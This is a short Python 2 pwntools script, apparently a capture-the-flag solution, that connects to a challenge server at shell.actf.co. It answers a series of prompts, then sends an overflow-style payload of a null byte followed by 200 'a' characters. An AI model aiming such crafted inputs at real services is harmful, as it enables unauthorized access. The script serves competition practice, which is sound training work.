from pwn import *

p = remote("shell.actf.co", 20702)

while True:
	command = p.recv()
	print 'command = ', command
	if command[0] == 'F':
		break
	p.sendline(command[0])

payload = ''
payload += '\x00'
payload += 'a'*200
print payload

p.sendline(payload)

print '==== recv ===='
print p.recv()
#print p.recvuntil('\n')
#print unpack(p.recv(),'all',endian='little', sign=False)


